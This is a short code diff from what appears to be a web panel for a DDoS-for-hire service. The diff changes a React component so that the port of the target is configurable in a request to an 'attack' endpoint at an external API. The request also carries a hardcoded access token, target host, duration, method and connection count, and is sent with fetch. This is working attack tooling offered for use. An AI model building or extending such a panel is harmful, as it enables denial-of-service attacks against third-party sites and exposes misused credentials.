@@ -156,7 +156,7 @@ export default function Panel() {
         setApiError(null);
         const token = "8xU8xJvvT6nF16JOF5XNT8";
         // Format L7 API url
-        const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(target)}&port=80&time=${finalDuration}&method=${method}&concs=${finalConns}&reqmethod=${reqMethod}`;
+        const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(target)}&port=${port || '80'}&time=${finalDuration}&method=${method}&concs=${finalConns}&reqmethod=${reqMethod}`;
         
         await fetch(apiUrl, { mode: 'no-cors' });
       } catch (err) {
